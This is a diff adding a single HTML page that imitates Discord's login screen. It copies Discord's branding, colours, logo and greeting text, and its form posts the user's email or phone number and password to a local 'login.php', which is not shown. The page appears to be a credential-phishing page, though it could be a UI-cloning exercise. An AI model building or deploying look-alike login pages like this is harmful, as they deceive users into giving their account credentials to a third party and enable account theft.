@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #36393f;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        
+        .login-container {
+            background-color: #2f3136;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+            width: 480px;
+            padding: 32px;
+            box-sizing: border-box;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .login-header h1 {
+            font-size: 24px;
+            line-height: 30px;
+            font-weight: 600;
+            margin-top: 0;
+            margin-bottom: 8px;
+        }
+        
+        .login-header p {
+            font-size: 16px;
+            line-height: 20px;
+            color: #b9bbbe;
+            margin: 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #b9bbbe;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        
+        .form-group input {
+            background-color: #202225;
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            border-radius: 3px;
+            box-sizing: border-box;
+            color: #dcddde;
+            font-size: 16px;
+            height: 40px;
+            padding: 10px;
+            width: 100%;
+            outline: none;
+        }
+        
+        .form-group input:focus {
+            border-color: #7289da;
+        }
+        
+        .forgot-password {
+            color: #7289da;
+            font-size: 14px;
+            margin-top: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .login-button {
+            background-color: #7289da;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            height: 44px;
+            min-width: 130px;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 8px;
+        }
+        
+        .login-button:hover {
+            background-color: #677bc4;
+        }
+        
+        .register-link {
+            margin-top: 4px;
+            font-size: 14px;
+            color: #7289da;
+            text-decoration: none;
+        }
+        
+        .register-link:hover {
+            text-decoration: underline;
+        }
+        
+        .qr-login {
+            text-align: center;
+            margin-top: 20px;
+            color: #b9bbbe;
+        }
+        
+        .logo {
+            height: 36px;
+            margin-bottom: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a69f118df70ad7828d4_icon_clyde_blurple_RGB.svg" alt="Discord Logo" class="logo">
+            <h1>Welcome back!</h1>
+            <p>We're so excited to see you again!</p>
+        </div>
+        
+        <form action="login.php" method="post">
+            <div class="form-group">
+                <label for="email">Email or Phone Number</label>
+                <input type="text" id="email" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                <a href="#" class="forgot-password">Forgot your password?</a>
+            </div>
+            
+            <button type="submit" class="login-button">Login</button>
+            
+            <div>
+                <span style="font-size: 14px; color: #b9bbbe;">Need an account?</span>
+                <a href="#" class="register-link">Register</a>
+            </div>
+        </form>
+        
+        <div class="qr-login">
+            <p>Log in with QR Code</p>
+            <p style="font-size: 12px;">Scan this with the Discord mobile app to log in instantly.</p>
+        </div>
+    </div>
+</body>
+</html>
